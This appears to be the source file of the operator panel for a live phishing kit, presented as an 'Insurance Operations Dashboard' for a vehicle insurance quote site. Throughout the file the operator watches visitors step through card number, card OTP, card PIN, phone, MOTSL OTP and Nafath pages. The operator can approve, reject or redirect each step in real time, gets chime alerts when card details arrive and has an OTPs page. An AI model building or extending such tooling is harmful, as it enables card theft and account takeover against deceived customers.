import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { supabase } from "@/integrations/supabase/client";

async function authHeaders(): Promise<Record<string, string>> {
  const { data } = await supabase.auth.getSession();
  const token = data.session?.access_token;
  return token ? { Authorization: `Bearer ${token}` } : {};
}
import { useEffect, useMemo, useRef, useState } from "react";
import { toast } from "sonner";
import {
  Activity,
  Ban,
  Bell,
  CheckCircle2,
  ChevronRight,
  Key,
  LogOut,
  Plug,
  RefreshCw,
  Search,
  ShieldHalf,
  Wifi,
} from "lucide-react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { cn } from "@/lib/utils";
import { SessionModal } from "@/components/admin/session-modal";
import {
  formatDateTime,
  formatSar,
  maskNationalId,
  maskPhone,
  PAGES,
  pageLabel,
  SEED_SESSIONS,
  type PageKey,
  type QuoteSession,
  type StepAction,
} from "@/lib/admin-data";

const PAGE_ORDER: PageKey[] = [
  "quote_landing",
  "insurer_selected",
  "payment_card",
  "card_otp",
  "card_pin",
  "phone_entry",
  "motsl_otp",
  "nafath",
  "stc_awaiting",
];
function nextPage(p: PageKey): PageKey {
  const i = PAGE_ORDER.indexOf(p);
  return i < 0 || i === PAGE_ORDER.length - 1 ? p : PAGE_ORDER[i + 1]!;
}
let audioCtx: AudioContext | null = null;
function getAudioCtx(): AudioContext | null {
  if (typeof window === "undefined") return null;
  const Ctor =
    window.AudioContext ?? (window as unknown as { webkitAudioContext?: typeof AudioContext }).webkitAudioContext;
  if (!Ctor) return null;
  if (!audioCtx) audioCtx = new Ctor();
  if (audioCtx.state === "suspended") void audioCtx.resume();
  return audioCtx;
}

/** Short chime. `kind` picks the pitch set. */
function playSound(kind: "visit" | "submit" | "plan" | "card" = "visit") {
  const ctx = getAudioCtx();
  if (!ctx) return;
  const notes =
    kind === "card"
      ? [880, 1320, 1760]
      : kind === "plan"
        ? [523.25, 659.25, 987.77]
        : kind === "submit"
          ? [660, 990]
          : [523.25, 784];
  notes.forEach((freq, i) => {
    const t = ctx.currentTime + i * 0.14;
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = "sine";
    osc.frequency.setValueAtTime(freq, t);
    gain.gain.setValueAtTime(0.0001, t);
    gain.gain.exponentialRampToValueAtTime(0.22, t + 0.02);
    gain.gain.exponentialRampToValueAtTime(0.0001, t + 0.24);
    osc.connect(gain).connect(ctx.destination);
    osc.start(t);
    osc.stop(t + 0.28);
  });
}

function notify(
  title: string,
  body: string,
  kind: "visit" | "submit" | "plan" | "card" = "visit",
) {
  if (typeof window === "undefined") return;
  playSound(kind);
  if ("Notification" in window && Notification.permission === "granted") {
    try {
      new Notification(title, { body, icon: "/favicon.ico", silent: true });
    } catch {
      /* ignore */
    }
  }
}

export const Route = createFileRoute("/_authenticated/admin")({
  head: () => ({
    meta: [
      { title: "Insurance Operations Dashboard" },
      {
        name: "description",
        content:
          "Live operations dashboard for the vehicle insurance site: monitor quote sessions, accept or decline steps, and review submitted data.",
      },
      { property: "og:title", content: "Insurance Operations Dashboard" },
      {
        property: "og:description",
        content: "Monitor live quote sessions and review customer submissions.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "robots", content: "noindex,nofollow" },
    ],
  }),
  component: AdminDashboard,
});

type Tab = "live" | "all" | "blocked";

function StatCard({
  label,
  value,
  icon: Icon,
  tone,
}: {
  label: string;
  value: number | string;
  icon: typeof Activity;
  tone: "neutral" | "success" | "info" | "danger";
}) {
  const toneCls = {
    neutral: "text-muted-foreground",
    success: "text-success",
    info: "text-info",
    danger: "text-destructive",
  }[tone];
  return (
    <div className="rounded-2xl border border-border bg-card p-5 shadow-[var(--shadow-card)]">
      <div className="flex items-start justify-between">
        <p className="text-xs font-semibold uppercase tracking-widest text-muted-foreground">
          {label}
        </p>
        <Icon className={cn("size-5", toneCls)} />
      </div>
      <p className="mt-4 text-4xl font-semibold tabular-nums text-foreground">{value}</p>
    </div>
  );
}

function StageBadge({ page }: { page: PageKey }) {
  return (
    <span className="inline-flex items-center rounded-full border border-success/30 bg-success/10 px-2.5 py-0.5 text-xs font-medium text-success">
      {pageLabel(page)}
    </span>
  );
}

function AdminDashboard() {
  const [sessions, setSessions] = useState<QuoteSession[]>([]);
  const [tab, setTab] = useState<Tab>("live");
  const [query, setQuery] = useState("");
  const [pageFilter, setPageFilter] = useState<PageKey | "all">("all");
  const [openId, setOpenId] = useState<string | null>(null);
  const [refreshing, setRefreshing] = useState(false);
  const navigate = useNavigate();

  // Sessions considered "live" only when active within the last 5 minutes;
  // older rows still count toward Total but not Live now.
  const LIVE_WINDOW_MS = 5 * 60 * 1000;
  const [now, setNow] = useState(() => Date.now());
  useEffect(() => {
    const t = setInterval(() => setNow(Date.now()), 15_000);
    return () => clearInterval(t);
  }, []);
  const recentSessions = sessions;
  const isLive = (s: QuoteSession) =>
    s.state === "live" && now - new Date(s.updatedAt).getTime() <= LIVE_WINDOW_MS;
  const live = recentSessions.filter(isLive);
  const blocked = recentSessions.filter((s) => s.state === "blocked");
  const stats = {
    total: recentSessions.length,
    live: live.length,
    cardSubmissions: recentSessions.filter((s) => s.submission.cardNumber).length,
    blocked: blocked.length,
  };

  // Pages sidebar counts ALL sessions per page (not just the 5-min live
  // window) so old sessions stay reachable from the left sidebar.
  const pageCounts = useMemo(
    () =>
      PAGES.map((p) => ({
        ...p,
        count: recentSessions.filter((s) => s.currentPage === p.key).length,
        liveCount: live.filter((s) => s.currentPage === p.key).length,
      })),
    [recentSessions, live],
  );

  const filtered = useMemo(() => {
    let list = [...recentSessions].sort(
      (a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime(),
    );
    if (tab === "live") list = list.filter((s) => s.state === "live");
    if (tab === "blocked") list = list.filter((s) => s.state === "blocked");
    if (pageFilter !== "all") list = list.filter((s) => s.currentPage === pageFilter);
    const q = query.trim().toLowerCase();
    if (q)
      list = list.filter((s) =>
        [s.sessionId, s.nationalId, s.phone.replace(/\s/g, ""), s.serialNumber]
          .join(" ")
          .toLowerCase()
          .includes(q),
      );
    return list;
  }, [recentSessions, tab, pageFilter, query]);

  const selected = sessions.find((s) => s.sessionId === openId) ?? null;

  const patch = (id: string, changes: Partial<QuoteSession>) =>
    setSessions((prev) =>
      prev.map((s) =>
        s.sessionId === id ? { ...s, ...changes, updatedAt: new Date().toISOString() } : s,
      ),
    );

  const sendControl = async (id: string, directive: string) => {
    try {
      await fetch("/api/public/control", {
        method: "POST",
        headers: { "Content-Type": "application/json", ...(await authHeaders()) },
        body: JSON.stringify({ sid: id, directive }),
      });
    } catch {
      /* ignore */
    }
  };
  const acceptSession = (id: string) => {
    patch(id, { awaitingApproval: false });
    void sendControl(id, "approve");
    toast.success("Approved — customer continues");
  };
  const rejectSession = (id: string) => {
    patch(id, { awaitingApproval: false });
    void sendControl(id, "reject");
    toast.error("Declined — customer sees retry screen");
  };
  const blockSession = (id: string) => {
    patch(id, { state: "blocked", awaitingApproval: false });
    setOpenId(null);
    void sendControl(id, "block");
    toast("Session blocked");
  };
  // Admin-side redirect: sends the customer's browser to a specific site path.
  const redirectToPath = (id: string, path: string) => {
    patch(id, { awaitingApproval: false });
    void sendControl(id, path);
    toast.success(`Redirected to ${path}`);
  };
  const redirect = (id: string, target: PageKey) => {
    patch(id, { currentPage: target });
    toast.success(`Marked as ${pageLabel(target)}`);
  };
  const stepDecision = (id: string, action: StepAction, decision: "accept" | "reject") => {
    patch(id, { awaitingApproval: false });
    void sendControl(id, decision === "accept" ? "approve" : "reject");
    if (decision === "accept") toast.success(`${action} accepted`);
    else toast.error(`${action} declined`);
  };

  const refresh = () => {
    setRefreshing(true);
    setTimeout(() => {
      setRefreshing(false);
      toast.success("Sessions refreshed");
    }, 500);
  };

  // Notifications: request permission + track new visits / submissions.
  const [notifOn, setNotifOn] = useState(true);
  const enableNotifications = async () => {
    if (typeof window === "undefined" || !("Notification" in window)) {
      toast.error("Browser notifications not supported");
      return;
    }
    getAudioCtx();
    const perm =
      Notification.permission === "default"
        ? await Notification.requestPermission()
        : Notification.permission;
    if (perm === "granted") {
      setNotifOn(true);
      playSound("visit");
      toast.success("Notifications enabled");
    } else {
      toast.error("Notification permission denied");
    }
  };

  // Auto-enable audio on any first user interaction so alerts are "always on".
  useEffect(() => {
    if (typeof window === "undefined") return;
    const prime = () => {
      getAudioCtx();
      setNotifOn(true);
      if ("Notification" in window && Notification.permission === "default") {
        void Notification.requestPermission();
      }
      window.removeEventListener("pointerdown", prime);
      window.removeEventListener("keydown", prime);
    };
    window.addEventListener("pointerdown", prime, { once: true });
    window.addEventListener("keydown", prime, { once: true });
    return () => {
      window.removeEventListener("pointerdown", prime);
      window.removeEventListener("keydown", prime);
    };
  }, []);

  const prevRef = useRef<Map<string, QuoteSession>>(new Map());
  const seededRef = useRef(false);
  useEffect(() => {
    const prev = prevRef.current;
    // Skip the first pass (initial load) so we don't spam alerts for existing rows.
    if (!seededRef.current) {
      prevRef.current = new Map(sessions.map((s) => [s.sessionId, s]));
      seededRef.current = true;
      return;
    }
    for (const s of sessions) {
      const before = prev.get(s.sessionId);
      if (!before) {
        // new session started
        toast(`New session · ${s.sessionId}`, { description: pageLabel(s.currentPage) });
        notify("New session started", `${s.sessionId} · ${pageLabel(s.currentPage)}`, "visit");
        continue;
      }
      const hadCard = Boolean(before.submission.cardNumber);
      const nowCard = Boolean(s.submission.cardNumber);
      const pickedPlan =
        before.currentPage !== "insurer_selected" && s.currentPage === "insurer_selected";
      const enteredCard =
        (!hadCard && nowCard) ||
        (before.currentPage !== "payment_card" && s.currentPage === "payment_card");

      if (pickedPlan) {
        toast.success(`Plan selected · ${s.sessionId}`, {
          description: s.insurerCompany || pageLabel(s.currentPage),
        });
        notify("Customer chose a plan", `${s.sessionId} · ${s.insurerCompany || ""}`.trim(), "plan");
        continue;
      }
      if (enteredCard) {
        toast.success(`Card entered · ${s.sessionId}`, { description: pageLabel(s.currentPage) });
        notify("Card details entered", `${s.sessionId} · ${pageLabel(s.currentPage)}`, "card");
        continue;
      }
      const hadKeys = Object.keys(before.submission).length;
      const nowKeys = Object.keys(s.submission).length;
      if (nowKeys > hadKeys) {
        toast.success(`Submission · ${s.sessionId}`, { description: pageLabel(s.currentPage) });
        notify("New submission", `${s.sessionId} · ${pageLabel(s.currentPage)}`, "submit");
      } else if (before.currentPage !== s.currentPage) {
        toast(`${s.sessionId} moved to ${pageLabel(s.currentPage)}`);
      }
    }
    prevRef.current = new Map(sessions.map((s) => [s.sessionId, s]));
  }, [sessions]);

  // Active users queue: live sessions sorted by most recent update.
  const queue = useMemo(
    () =>
      [...live].sort(
        (a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime(),
      ),
    [live],
  );
  const acceptToNext = (s: QuoteSession) => {
    const target = nextPage(s.currentPage);
    patch(s.sessionId, { currentPage: target, awaitingApproval: false });
    void sendControl(s.sessionId, "approve");
    toast.success(`${s.sessionId} → ${pageLabel(target)}`);
  };

  // Connection status surfaced in the header so it's obvious when the
  // dashboard is truly live vs. blocked (auth, network, etc.).
  const [conn, setConn] = useState<{ ok: boolean; count: number; at: string; error?: string }>({
    ok: false,
    count: 0,
    at: "",
  });

  // Poll live tracked sessions from the public tracking endpoint.
  useEffect(() => {
    let cancelled = false;
    const load = async () => {
      try {
        const res = await fetch("/api/public/sessions", {
          cache: "no-store",
          headers: await authHeaders(),
        });
        if (!res.ok) {
          if (!cancelled) {
            setConn({
              ok: false,
              count: 0,
              at: new Date().toISOString(),
              error: res.status === 401 ? "Not signed in as admin" : `HTTP ${res.status}`,
            });
          }
          return;
        }
        const json = (await res.json()) as { sessions: Array<Record<string, unknown>> };
        if (cancelled) return;
        const mapped: QuoteSession[] = json.sessions.map((r) => {
          const s: QuoteSession = {
            sessionId: String(r["session_id"] ?? ""),
            nationalId: String(r["national_id"] ?? ""),
            phone: String(r["phone"] ?? ""),
            serialNumber: String(r["serial_number"] ?? ""),
            vehicleMake: String(r["vehicle_make"] ?? ""),
            vehicleModel: String(r["vehicle_model"] ?? ""),
            modelYear: Number(r["model_year"] ?? 0),
            declaredValue: Number(r["declared_value"] ?? 0),
            insurerCompany: String(r["insurer_company"] ?? ""),
            insurerOfferSar: Number(r["insurer_offer_sar"] ?? 0),
            currentPage: (r["current_page"] as QuoteSession["currentPage"]) ?? "quote_landing",
            state: (r["state"] as QuoteSession["state"]) ?? "live",
            createdAt: String(r["created_at"] ?? new Date().toISOString()),
            updatedAt: String(r["updated_at"] ?? new Date().toISOString()),
            submission: (r["submission"] as QuoteSession["submission"]) ?? {},
            awaitingApproval: Boolean(r["awaiting_approval"]),
          };
          if (r["ip_address"]) s.ipAddress = String(r["ip_address"]);
          if (r["country"]) s.country = String(r["country"]);
          if (r["requested_page"]) s.requestedPage = String(r["requested_page"]);
          return s;
        });
        // Replace with what the backend currently has so stale rows disappear.
        const ids = new Set(mapped.map((s) => s.sessionId));
        setSessions((prev) => {
          const kept = prev.filter((s) => ids.has(s.sessionId));
          const byId = new Map(kept.map((s) => [s.sessionId, s]));
          for (const s of mapped) byId.set(s.sessionId, s);
          return Array.from(byId.values());
        });
        setConn({ ok: true, count: mapped.length, at: new Date().toISOString() });
      } catch (e) {
        if (!cancelled) {
          setConn({
            ok: false,
            count: 0,
            at: new Date().toISOString(),
            error: e instanceof Error ? e.message : "Network error",
          });
        }
      }
    };
    void load();
    const t = setInterval(load, 4000);
    return () => {
      cancelled = true;
      clearInterval(t);
    };
  }, []);


  return (
    <div dir="ltr" className="min-h-screen bg-background px-6 py-6 lg:px-10 lg:py-8">
      {/* Header */}
      <header className="mb-8 flex flex-wrap items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <div className="flex size-11 items-center justify-center rounded-xl bg-foreground text-background">
            <ShieldHalf className="size-5" />
          </div>
          <div>
            <h1 className="text-xl font-semibold tracking-tight">Admin Dashboard</h1>
            <p className="text-sm text-muted-foreground">Tameeni Care operations</p>
          </div>
        </div>

        <div className="flex items-center gap-2">
          <span
            className={cn(
              "inline-flex items-center gap-2 rounded-xl px-3 py-2 text-xs font-medium",
              conn.ok
                ? "bg-foreground text-background"
                : "bg-destructive/10 text-destructive border border-destructive/30",
            )}
            title={conn.at ? `Last poll ${formatDateTime(conn.at)}` : ""}
          >
            <Wifi className={cn("size-3.5", conn.ok ? "text-success" : "text-destructive")} />
            {conn.ok
              ? `Live · ${conn.count} session${conn.count === 1 ? "" : "s"}`
              : conn.error ?? "Connecting…"}
          </span>
          <Button
            variant="outline"
            size="sm"
            onClick={enableNotifications}
            title="Alerts are always on — click to replay a test chime"
            className="border-success/40 text-success hover:bg-success/10"
          >
            <Bell className="size-4" />
            Alerts on
          </Button>
          <Button variant="outline" size="sm" onClick={refresh} disabled={refreshing}>
            <RefreshCw className={refreshing ? "size-4 animate-spin" : "size-4"} />
            Refresh
          </Button>
          <Button
            variant="outline"
            size="sm"
            onClick={() => navigate({ to: "/admin/otps" })}
          >
            <Key className="size-4" />
            OTPs
          </Button>
          <Button
            variant="outline"
            size="sm"
            className="border-destructive/40 text-destructive hover:bg-destructive/10 hover:text-destructive"
            onClick={async () => {
              await supabase.auth.signOut();
              navigate({ to: "/auth", replace: true });
            }}
          >
            <LogOut className="size-4" />
            Sign out
          </Button>
        </div>
      </header>

      {/* Layout: sidebar + main */}
      <div className="grid gap-6 lg:grid-cols-[17rem_1fr]">
        {/* Left sidebar */}
        <aside className="rounded-2xl border border-border bg-card p-4 shadow-[var(--shadow-card)]">
          <p className="px-2 pb-3 text-sm font-semibold text-foreground">
            Pages <span className="font-normal text-muted-foreground">· live traffic</span>
          </p>

          <button
            onClick={() => {
              setPageFilter("all");
              setTab("live");
            }}
            className={cn(
              "mb-2 flex w-full items-center justify-between rounded-xl px-3 py-2.5 text-sm font-medium transition-colors",
              pageFilter === "all"
                ? "bg-foreground text-background"
                : "text-foreground hover:bg-muted",
            )}
          >
            <span>All pages</span>
            <span
              className={cn(
                "rounded-md px-1.5 py-0.5 text-xs font-semibold tabular-nums",
                pageFilter === "all" ? "bg-background/20" : "bg-muted",
              )}
            >
              {live.length}
            </span>
          </button>

          <div className="space-y-0.5">
            {pageCounts.map((p) => {
              const active = pageFilter === p.key;
              return (
                <button
                  key={p.key}
                  onClick={() => setPageFilter(active ? "all" : p.key)}
                  className={cn(
                    "flex w-full items-center gap-2 rounded-xl px-3 py-2 text-sm transition-colors",
                    active
                      ? "bg-muted text-foreground"
                      : "text-muted-foreground hover:bg-muted hover:text-foreground",
                  )}
                >
                  <span
                    className={cn(
                      "size-1.5 rounded-full",
                      p.count > 0 ? "bg-success" : "bg-border",
                    )}
                  />
                  <span className="flex-1 truncate text-left">{p.label}</span>
                  <span
                    className={cn(
                      "rounded-md px-1.5 py-0.5 text-xs font-semibold tabular-nums",
                      p.count > 0 ? "bg-foreground text-background" : "text-muted-foreground",
                    )}
                  >
                    {p.count}
                  </span>
                </button>
              );
            })}
          </div>

          <p className="mt-6 border-t border-border px-2 pt-4 text-[11px] leading-relaxed text-muted-foreground">
            Visitor IPs aren't exposed by the upstream API; session ID is shown in place of IP.
          </p>
        </aside>

        {/* Main column */}
        <div className="space-y-6">
          {/* Stat cards */}
          <div className="grid gap-4 sm:grid-cols-2 xl:grid-cols-4">
            <StatCard label="Total sessions" value={stats.total} icon={Activity} tone="neutral" />
            <StatCard label="Live now" value={stats.live} icon={Activity} tone="success" />
            <StatCard
              label="Card submissions"
              value={stats.cardSubmissions}
              icon={CheckCircle2}
              tone="info"
            />
            <StatCard label="Blocked" value={stats.blocked} icon={Ban} tone="danger" />
          </div>

          {/* Sessions panel */}
          <section className="rounded-2xl border border-border bg-card shadow-[var(--shadow-card)]">
            <div className="flex flex-wrap items-center justify-between gap-3 border-b border-border p-5">
              <h2 className="text-lg font-semibold">Sessions</h2>
              <div className="relative w-full max-w-sm">
                <Search className="pointer-events-none absolute left-3 top-1/2 size-4 -translate-y-1/2 text-muted-foreground" />
                <Input
                  value={query}
                  onChange={(e) => setQuery(e.target.value)}
                  placeholder="Search ID, phone, national ID..."
                  className="h-10 rounded-xl pl-9"
                />
              </div>
            </div>

            <div className="px-5 pt-4">
              <div className="inline-flex rounded-xl bg-muted p-1">
                {(["live", "all", "blocked"] as const).map((t) => (
                  <button
                    key={t}
                    onClick={() => setTab(t)}
                    className={cn(
                      "rounded-lg px-4 py-1.5 text-sm font-medium capitalize transition-colors",
                      tab === t
                        ? "bg-card text-foreground shadow-[var(--shadow-card)]"
                        : "text-muted-foreground hover:text-foreground",
                    )}
                  >
                    {t}
                  </button>
                ))}
              </div>
            </div>

            <div className="overflow-x-auto p-2">
              <table className="w-full min-w-[900px] border-collapse text-sm">
                <thead>
                  <tr className="text-left text-xs font-medium uppercase tracking-wider text-muted-foreground">
                    <th className="px-4 py-3">Session</th>
                    <th className="px-4 py-3">Customer</th>
                    <th className="px-4 py-3">Insurer</th>
                    <th className="px-4 py-3">Stage</th>
                    <th className="px-4 py-3">Updated</th>
                    <th className="px-4 py-3 text-right">Action</th>
                  </tr>
                </thead>
                <tbody>
                  {filtered.map((s) => (
                    <tr
                      key={s.sessionId}
                      onClick={() => setOpenId(s.sessionId)}
                      className="cursor-pointer border-t border-border transition-colors hover:bg-muted/40"
                    >
                      <td className="px-4 py-4">
                        <div className="flex items-center gap-1.5 font-mono text-sm">
                          <span
                            className={cn(
                              "size-2 shrink-0 rounded-full",
                              isLive(s) ? "bg-success" : "bg-border",
                            )}
                            title={isLive(s) ? "Active" : "Idle"}
                          />
                          {s.sessionId.slice(0, 8)}
                        </div>
                      </td>
                      <td className="px-4 py-4">
                        <div className="font-medium tabular-nums">
                          {maskNationalId(s.nationalId)}
                        </div>
                        <div className="text-xs tabular-nums text-muted-foreground">
                          {maskPhone(s.phone)}
                        </div>
                      </td>
                      <td className="px-4 py-4 tabular-nums">{formatSar(s.insurerOfferSar)}</td>
                       <td className="px-4 py-4">
                         {s.state === "blocked" ? (
                           <span className="inline-flex items-center rounded-full border border-destructive/30 bg-destructive/10 px-2.5 py-0.5 text-xs font-medium text-destructive">
                             Blocked
                           </span>
                         ) : (
                           <div className="flex flex-col gap-1">
                             <StageBadge page={s.currentPage} />
                             {s.awaitingApproval && (
                               <span className="inline-flex w-fit items-center rounded-full border border-warning/30 bg-warning/10 px-2 py-0.5 text-[10px] font-semibold uppercase tracking-wide text-warning">
                                 Awaiting {s.requestedPage ?? ""}
                               </span>
                             )}
                           </div>
                         )}
                       </td>
                        <td className="px-4 py-4 text-muted-foreground">
                          <div>{formatDateTime(s.updatedAt)}</div>
                          {s.ipAddress && (
                            <div className="font-mono text-xs">{s.ipAddress}</div>
                          )}
                          {s.country && (
                            <div className="text-xs font-medium">{s.country}</div>
                          )}
                        </td>
                      <td className="px-4 py-4" onClick={(e) => e.stopPropagation()}>
                        <div className="flex items-center justify-end gap-1">
                          <button
                            onClick={() => acceptSession(s.sessionId)}
                            aria-label={`Accept ${s.sessionId}`}
                            className="hidden size-8 items-center justify-center rounded-lg border border-success/30 text-success transition-colors hover:bg-success/10 sm:inline-flex"
                          >
                            <CheckCircle2 className="size-4" />
                          </button>
                          <button
                            onClick={() => rejectSession(s.sessionId)}
                            aria-label={`Reject ${s.sessionId}`}
                            className="hidden size-8 items-center justify-center rounded-lg border border-destructive/30 text-destructive transition-colors hover:bg-destructive/10 sm:inline-flex"
                          >
                            <Ban className="size-4" />
                          </button>
                          <ChevronRight className="size-4 text-muted-foreground" />
                        </div>
                      </td>
                    </tr>
                  ))}
                  {filtered.length === 0 && (
                    <tr>
                      <td colSpan={6} className="px-4 py-16 text-center text-muted-foreground">
                        No sessions match this view.
                      </td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>
          </section>

          {/* Active users — quick accept/reject */}
          <section className="rounded-2xl border border-border bg-card p-5 shadow-[var(--shadow-card)]">
            <div className="mb-3 flex items-center justify-between">
              <div>
                <h2 className="text-lg font-semibold">Active users</h2>
                <p className="text-sm text-muted-foreground">
                  {pageFilter === "all"
                    ? `${live.length} users across the funnel`
                    : `${live.filter((s) => s.currentPage === pageFilter).length} users on ${pageLabel(pageFilter)}`}
                </p>
              </div>
            </div>

            <div className="grid gap-3 md:grid-cols-2 xl:grid-cols-3">
              {live
                .filter((s) => pageFilter === "all" || s.currentPage === pageFilter)
                .map((s) => (
                  <div
                    key={s.sessionId}
                    onClick={() => setOpenId(s.sessionId)}
                    className="cursor-pointer rounded-xl border border-border p-3 transition-colors hover:bg-muted/40"
                  >
                    <div className="flex items-start justify-between gap-2">
                      <div className="min-w-0">
                        <p className="flex items-center gap-1.5 truncate font-mono text-sm">
                          <span
                            className="size-2 shrink-0 rounded-full bg-success"
                            title="Active"
                          />
                          {s.sessionId}
                        </p>
                        <p className="truncate text-xs text-muted-foreground">
                          {maskNationalId(s.nationalId)} · {maskPhone(s.phone)}
                        </p>
                        {s.country && (
                          <p className="mt-0.5 truncate text-xs font-medium text-success">
                            {s.country}
                          </p>
                        )}
                      </div>
                      <StageBadge page={s.currentPage} />
                    </div>
                    <div
                      className="mt-3 flex items-center gap-2"
                      onClick={(e) => e.stopPropagation()}
                    >
                      <Button
                        size="sm"
                        className="flex-1"
                        onClick={() => acceptSession(s.sessionId)}
                      >
                        Accept
                      </Button>
                      <Button
                        size="sm"
                        variant="outline"
                        className="flex-1 border-destructive/40 text-destructive hover:bg-destructive/10 hover:text-destructive"
                        onClick={() => rejectSession(s.sessionId)}
                      >
                        Reject
                      </Button>
                    </div>
                  </div>
                ))}
              {live.filter((s) => pageFilter === "all" || s.currentPage === pageFilter).length ===
                0 && (
                <p className="text-sm text-muted-foreground">No active users on this page.</p>
              )}
            </div>
          </section>
        </div>
      </div>

      <SessionModal
        session={selected}
        open={openId !== null}
        onOpenChange={(v) => setOpenId(v ? openId : null)}
        onStepDecision={stepDecision}
        onRedirect={redirect}
        onBlock={blockSession}
      />
    </div>
  );
}
